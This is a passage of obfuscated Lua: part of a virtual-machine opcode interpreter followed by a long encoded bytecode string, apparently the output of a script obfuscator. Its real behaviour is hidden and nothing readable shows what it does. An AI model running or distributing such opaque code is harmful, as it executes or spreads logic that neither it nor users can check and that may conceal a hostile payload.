d;w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]][y[834]]=y[784];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];d=y[131]w[d]=w[d](r(w,d+1,y[834]))else local d;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]]*y[784];n=n+1;y=f[n];w[y[131]]=w[y[834]]+w[y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]]+w[y[784]];n=n+1;y=f[n];d=y[131]w[d]=w[d](r(w,d+1,y[834]))end;elseif z<=309 then if 307>=z then local d;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]]*y[784];n=n+1;y=f[n];w[y[131]]=w[y[834]]+w[y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]]+w[y[784]];n=n+1;y=f[n];d=y[131]w[d]=w[d](r(w,d+1,y[834]))elseif 309>z then if(w[y[131]]~=w[y[784]])then n=n+1;else n=y[834];end;else do return end;end;elseif 310>=z then local d;local m;local q;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];q=y[131]m={w[q](w[q+1])};d=0;for v=q,y[784]do d=d+1;w[v]=m[d];end elseif z>311 then local d;w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=false;n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];for m=y[131],y[834],1 do w[m]=nil;end;n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];d=y[131]w[d]=w[d](w[d+1])else w[y[131]]=w[y[834]]%w[y[784]];end;elseif z<=324 then if 318>=z then if 315>=z then if z<=313 then w={};for d=0,u,1 do if d<o then w[d]=s[d+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];if w[y[131]]then n=n+1;else n=y[834];end;elseif 314==z then w[y[131]]=#w[y[834]];else local d;w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];d=y[131]w[d]=w[d](r(w,d+1,y[834]))end;elseif 316>=z then w={};for d=0,u,1 do if d<o then w[d]=s[d+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]]+y[784];n=n+1;y=f[n];h[y[834]]=w[y[131]];n=n+1;y=f[n];do return end;n=n+1;y=f[n];do return end;elseif z==317 then if(w[y[131]]~=y[784])then n=n+1;else n=y[834];end;else w={};for d=0,u,1 do if d<o then w[d]=s[d+1];else break;end;end;end;elseif z<=321 then if z<=319 then local d;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];d=y[131]w[d]=w[d](r(w,d+1,y[834]))elseif z==320 then local d;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];d=y[131]w[d](r(w,d+1,y[834]))else local d;local m;local q;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];q=y[131]m={w[q](w[q+1])};d=0;for v=q,y[784]do d=d+1;w[v]=m[d];end end;elseif z<=322 then local d;local m;local q;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];q=y[834];m=y[784];d=k(w,g,q,m);w[y[131]]=d;elseif z>323 then w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];n=y[834];else local d;local m;w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]={r({},1,y[834])};n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];m=y[131];d=w[m];for q=m+1,y[834]do t(d,w[q])end;end;elseif 330>=z then if z<=327 then if 325>=z then local d,m=0 while true do if(d<=7)then if(d<=3)then if(d==1 or d<1)then if not(d~=0)then m=nil else w[y[131]]=w[y[834]][y[784]];end else if(d~=3)then n=(n+1);else y=f[n];end end else if(d<=5)then if(d<5)then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if(d>6)then w[y[131]]=h[y[834]];else y=f[n];end end end else if d<=11 then if(d==9 or d<9)then if(9~=d)then n=(n+1);else y=f[n];end else if(10<d)then n=n+1;else w[y[131]]=w[y[834]][y[784]];end end else if(d<=13)then if(13>d)then y=f[n];else m=y[131]end else if not(15==d)then w[m]=w[m](r(w,m+1,y[834]))else break end end end end d=d+1 end elseif(z>326)then local d,m=0 while true do if d<=14 then if d<=6 then if d<=2 then if d<=0 then m=nil else if d==1 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if d<=4 then if 4~=d then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if d~=6 then n=n+1;else y=f[n];end end end else if d<=10 then if d<=8 then if d<8 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if d~=10 then y=f[n];else w[y[131]]=w[y[834]]*y[784];end end else if d<=12 then if d>11 then y=f[n];else n=n+1;end else if 14~=d then w[y[131]]=w[y[834]]+w[y[784]];else n=n+1;end end end end else if d<=22 then if d<=18 then if d<=16 then if d~=16 then y=f[n];else w[y[131]]=j[y[834]];end else if 18>d then n=n+1;else y=f[n];end end else if d<=20 then if 20>d then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if d~=22 then y=f[n];else w[y[131]]=w[y[834]];end end end else if d<=26 then if d<=24 then if d~=24 then n=n+1;else y=f[n];end else if d<26 then w[y[131]]=w[y[834]]+w[y[784]];else n=n+1;end end else if d<=28 then if d>27 then m=y[131]else y=f[n];end else if d==29 then w[m]=w[m](r(w,m+1,y[834]))else break end end end end end d=d+1 end else local d=0 while true do if d<=6 then if d<=2 then if d<=0 then w[y[131]]=h[y[834]];else if 1==d then n=n+1;else y=f[n];end end else if d<=4 then if d>3 then n=n+1;else w[y[131]]=h[y[834]];end else if d==5 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end else if d<=9 then if d<=7 then n=n+1;else if d>8 then w[y[131]]=w[y[834]][w[y[784]]];else y=f[n];end end else if d<=11 then if d>10 then y=f[n];else n=n+1;end else if 12<d then break else if(w[y[131]]~=y[784])then n=n+1;else n=y[834];end;end end end end d=d+1 end end;elseif(328==z or 328>z)then w[y[131]]=false;n=(n+1);elseif not(329~=z)then local d=y[131];do return r(w,d,p)end;else for d=y[131],y[834],1 do w[d]=nil;end;end;elseif 333>=z then if 331>=z then local d=y[131]local m,q=i(w[d](r(w,d+1,y[834])))p=q+d-1 local q=0;for v=d,p do q=q+1;w[v]=m[q];end;elseif z~=333 then w[y[131]]=w[y[834]][w[y[784]]];else w[y[131]]=w[y[834]]/y[784];n=n+1;y=f[n];w[y[131]]=w[y[834]]-w[y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]]/y[784];n=n+1;y=f[n];w[y[131]]=w[y[834]]*y[784];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];n=y[834];end;elseif 334>=z then local d=y[131]local m={w[d](r(w,d+1,y[834]))};local q=0;for v=d,y[784]do q=(q+1);w[v]=m[q];end;elseif z==335 then local d;w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=true;n=n+1;y=f[n];d=y[131]w[d]=w[d](r(w,d+1,y[834]))else local d;w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];d=y[131]w[d]=w[d](r(w,d+1,y[834]))end;elseif 360>=z then if 348>=z then if z<=342 then if 339>=z then if 337>=z then local d,m=0 while true do if(d==8 or d<8)then if(d<=3)then if(d<=1)then if not(d==1)then m=nil else w[y[131]]=w[y[834]][y[784]];end else if(d==2)then n=(n+1);else y=f[n];end end else if d<=5 then if(d~=5)then w[y[131]]=h[y[834]];else n=n+1;end else if(d<=6)then y=f[n];else if not(d==8)then w[y[131]]=w[y[834]][w[y[784]]];else n=n+1;end end end end else if(d<=13)then if(d==10 or d<10)then if not(9~=d)then y=f[n];else w[y[131]]=h[y[834]];end else if(d==11 or d<11)then n=n+1;else if 12<d then w[y[131]]=w[y[834]][y[784]];else y=f[n];end end end else if(d<=15)then if(15~=d)then n=n+1;else y=f[n];end else if(d<16 or d==16)then m=y[131]else if(17==d)then w[m]=w[m](r(w,m+1,y[834]))else break end end end end end d=d+1 end elseif not(z==339)then local d=y[131];local m=w[y[834]];w[d+1]=m;w[d]=m[w[y[784]]];else local d,m=0 while true do if d<=12 then if d<=5 then if d<=2 then if d<=0 then m=nil else if d~=2 then w={};else for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;end end else if d<=3 then n=n+1;else if d>4 then w[y[131]]=h[y[834]];else y=f[n];end end end else if d<=8 then if d<=6 then n=n+1;else if d~=8 then y=f[n];else w[y[131]]=j[y[834]];end end else if d<=10 then if 10>d then n=n+1;else y=f[n];end else if 11<d then n=n+1;else w[y[131]]=w[y[834]][y[784]];end end end end else if d<=18 then if d<=15 then if d<=13 then y=f[n];else if d==14 then w[y[131]]=y[834];else n=n+1;end end else if d<=16 then y=f[n];else if 17<d then n=n+1;else w[y[131]]=y[834];end end end else if d<=21 then if d<=19 then y=f[n];else if 20<d then n=n+1;else w[y[131]]=y[834];end end else if d<=23 then if d==22 then y=f[n];else m=y[131]end else if 25~=d then w[m]=w[m](r(w,m+1,y[834]))else break end end end end end d=d+1 end end;elseif z<=340 then w[y[131]]=(not w[y[834]]);elseif z~=342 then a(c,e);else local a;w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];a=y[131]w[a]=w[a](r(w,a+1,y[834]))end;elseif z<=345 then if z<=343 then n=y[834];elseif z==344 then w[y[131]]=#w[y[834]];else local a;local c;local d;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];d=y[131]c={w[d](w[d+1])};a=0;for e=d,y[784]do a=a+1;w[e]=c[a];end end;elseif z<=346 then if(w[y[131]]~=w[y[784]])then n=y[834];else n=n+1;end;elseif 348>z then local a;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];a=y[131]w[a]=w[a]()else w[y[131]]=false;n=n+1;end;elseif 354>=z then if z<=351 then if 349>=z then h[y[834]]=w[y[131]];elseif z<351 then local a;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];a=y[131]w[a]=w[a](r(w,a+1,y[834]))else if w[y[131]]then n=n+1;else n=y[834];end;end;elseif 352>=z then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];a=y[131]w[a]=w[a](r(w,a+1,y[834]))elseif 354~=z then local a;local c;local d;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];d=y[131]c={w[d](w[d+1])};a=0;for e=d,y[784]do a=a+1;w[e]=c[a];end else w[y[131]][y[834]]=w[y[784]];end;elseif z<=357 then if 355>=z then local a;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];a=y[131]w[a]=w[a]()elseif z<357 then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];a=y[131]w[a]=w[a](r(w,a+1,y[834]))else local a;w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];a=y[131]w[a]=w[a](r(w,a+1,y[834]))end;elseif 358>=z then local a;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];a=y[131]w[a]=w[a](r(w,a+1,y[834]))elseif z>359 then w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]]+y[784];n=n+1;y=f[n];h[y[834]]=w[y[131]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]();else local a;local c;w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]={r({},1,y[834])};n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];c=y[131];a=w[c];for d=c+1,y[834]do t(a,w[d])end;end;elseif 372>=z then if z<=366 then if z<=363 then if 361>=z then local a;w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];a=y[131]w[a]=w[a](r(w,a+1,y[834]))elseif 362<z then local a;local c;local d;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];d=y[131]c={w[d](w[d+1])};a=0;for e=d,y[784]do a=a+1;w[e]=c[a];end else local a;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];a=y[131]w[a]=w[a]()end;elseif 364>=z then local a;local c;local d;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];d=y[131]c={w[d](w[d+1])};a=0;for e=d,y[784]do a=a+1;w[e]=c[a];end elseif z>365 then if(w[y[131]]<=w[y[784]])then n=y[834];else n=n+1;end;else w[y[131]]=w[y[834]];end;elseif 369>=z then if 367>=z then local a;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];a=y[131];do return w[a](r(w,a+1,y[834]))end;n=n+1;y=f[n];a=y[131];do return r(w,a,p)end;n=n+1;y=f[n];n=y[834];elseif 369>z then local a;local c,d;local e;w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];e=y[131]c,d=i(w[e](r(w,e+1,y[834])))p=d+e-1 a=0;for d=e,p do a=a+1;w[d]=c[a];end;else local a=y[131];local c,d,e=w[a],w[a+1],w[a+2];local c=c+e;w[a]=c;if e>0 and c<=d or e<0 and c>=d then n=y[834];w[a+3]=c;end;end;elseif z<=370 then w[y[131]]=y[834];elseif 371==z then local a=y[131];local c=w[y[834]];w[a+1]=c;w[a]=c[w[y[784]]];else if(y[131]<=w[y[784]])then n=n+1;else n=y[834];end;end;elseif 378>=z then if z<=375 then if(z<=373)then local a,c,d,e=0 while true do if a<=15 then if a<=7 then if a<=3 then if a<=1 then if a<1 then c=nil else d=nil end else if 3>a then e=nil else w[y[131]]=w[y[834]][y[784]];end end else if a<=5 then if 4==a then n=n+1;else y=f[n];end else if a>6 then n=n+1;else w[y[131]]=w[y[834]];end end end else if a<=11 then if a<=9 then if a>8 then w[y[131]]=h[y[834]];else y=f[n];end else if 10==a then n=n+1;else y=f[n];end end else if a<=13 then if a<13 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if 15~=a then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if a<=23 then if a<=19 then if a<=17 then if 16==a then n=n+1;else y=f[n];end else if a<19 then w[y[131]]=h[y[834]];else n=n+1;end end else if a<=21 then if 20==a then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if a~=23 then n=n+1;else y=f[n];end end end else if a<=27 then if a<=25 then if 24<a then n=n+1;else w[y[131]]=w[y[834]][y[784]];end else if a>26 then e=y[834];else y=f[n];end end else if a<=29 then if a==28 then d=y[784];else c=k(w,g,e,d);end else if 30==a then w[y[131]]=c;else break end end end end end a=a+1 end elseif 375~=z then local a=y[131];local c,d,e=w[a],w[a+1],w[(a+2)];local c=c+e;w[a]=c;if e>0 and c<=d or e<0 and c>=d then n=y[834];w[(a+3)]=c;end;else w[y[131]][w[y[834]]]=w[y[784]];end;elseif 376>=z then local a=y[131]w[a]=w[a](r(w,a+1,y[834]))elseif 377==z then local a=y[131];local c=w[a];for d=a+1,y[834]do t(c,w[d])end;else if not w[y[131]]then n=n+1;else n=y[834];end;end;elseif z<=381 then if z<=379 then local a;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];a=y[131]w[a]=w[a](r(w,a+1,y[834]))elseif 381~=z then local a;w[y[131]]={};n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];a=y[131]w[a](r(w,a+1,y[834]))else local a;local c;local d;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];d=y[131]c={w[d](w[d+1])};a=0;for e=d,y[784]do a=a+1;w[e]=c[a];end end;elseif z<=383 then if 383>z then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 1>a then c=nil else w[y[131]][y[834]]=w[y[784]];end else if 2<a then y=f[n];else n=n+1;end end else if a<=5 then if 5~=a then w[y[131]]={};else n=n+1;end else if 6<a then w[y[131]][y[834]]=y[784];else y=f[n];end end end else if a<=11 then if a<=9 then if 9>a then n=n+1;else y=f[n];end else if 11>a then w[y[131]][y[834]]=w[y[784]];else n=n+1;end end else if a<=13 then if 12<a then c=y[131]else y=f[n];end else if 14==a then w[c]=w[c](r(w,c+1,y[834]))else break end end end end a=a+1 end else w[y[131]]={};end;elseif z>384 then local a;local c;local d;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];d=y[131]c={w[d](w[d+1])};a=0;for e=d,y[784]do a=a+1;w[e]=c[a];end else local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];a=y[131]w[a](w[a+1])end;n=n+1;end;end;end;return b(cr(),{},l())();end)('23522K22822K26H21821927A27B27C21921821427B22L22N21W21V22H27F27B22H22422721T22021821727B22621U21V22622427M27V27A22M22H27J21V22221821527W21X22422N28A27B21S28121X21821B27B21U22M27N27A22122022722G28928B27A27P22M21Y21821027W21U22N21U22G22H27K27T28X21922327K22121821627B22222022H22322021V22J27U27B22G21V22L22422629127G27A22L28021T21T29H29J29L27K22321U28G27A2A82AA1X27B22M29L21S29L28127Q27S21821A27B22N22022L2AO2AG22G22728Q21928I22H22628K21127O28O28627K28928321927K2AH22N27M29C22222M2AW21827927A25I27D27A23B23121821X27B25D22E1U1C22J24226U24B25A21X2621G22924T24U23K26C24126R22V1C23M26524Q25E24626R1222V1F21424N22621E25U2601K1K23721T21M21D21H21B25P26I1G26424V22721Z22D27021426V1H21J262151R26622Q21Q23V25A21S23Q26826325926122R1O25625F23X26Z27023M1I22L1N21C22N22R22325B21V25X22S21B1M22Z1O26Q21A26P22223422E2731N1P122AB21924T1Z23J23D2BK27B24T2EX27A2422F021924Y2AU27A24A1L21V2F323M2F324N2F621926C21E21H2ER24N1Z23423321821227B23T1Y22Y23G1826V23O26L25Z21225B2181Y27B24521F22U23C1O26Y24726N26L1W24O22U21K25Q25N2A527A24121M23J23921Q26823P21821O27B24421123F2181T26824F27225S1X24P21W21Q25M25L26K23L21821K27B24321F23H22R21J27123O25725K21824P22T21C25D26525W23V26U2441B22X21821327B23R21L23023321Q25W2H325U1X21821H2I421023B22X21H26U23P25727121625223J1Z27225E26H23K26S23L21022R26M24Y2602AY24621Q23B23C21Q21823G27B24P2FT23G21424O26125025O21024T21Q21I25G26226G2CC23Q1K22X26O25A25H24S26A2462301J1X22325K1Z1T23K25523E2341S21823321U22822L24F23V22X26R27321P21A1Z24D22K24222L23E24B22221626P1F22N26A25S23326P23S24Y25L2581F23525L25326G24F25U26M22V21O2182AF27A24F23723121223725826324Y24B21I26O21G28L27B26C22V21821N27B23V1522921U23F26U24326W25T1X24Z23I21I23X25K26923X2712461321I24I2HE2FR1222222K23F26824326I25N1W24P22S23525N25R26H23S26S2472AT2BL27A2GL21924321J22V21W21M26S23W29R27A23T21L23722T21Q2692AY23Y1X23422X2152NF23M21L22923F21H2FX2FP27B2412IH23E21M26E24325N25U21C24P2NF2OB23B2OD2OF2181W27B26Y21P23B22O21J24Y24227226021024V23G2112182B42NP1Z2LO21H27124F2732IE27B23Z21L21Q22W21Q2NA26M25U21D26Y22O21P25O25Z26D24624X2451823D26K25523V2OQ2OS2OU2OW24Y23Q26H25Z21F25722S2LY2IF27A2PH21Q23G21526Z23K26Y25M1W2PQ2PS2PU2PW2PY2Q02Q22GU2Q52OV2OX2Q92QB2QD21G26525E26T24721821G2PG2PI2QK2QM2QO1W26P21C1X25D25R26X23L26B25V1122R26V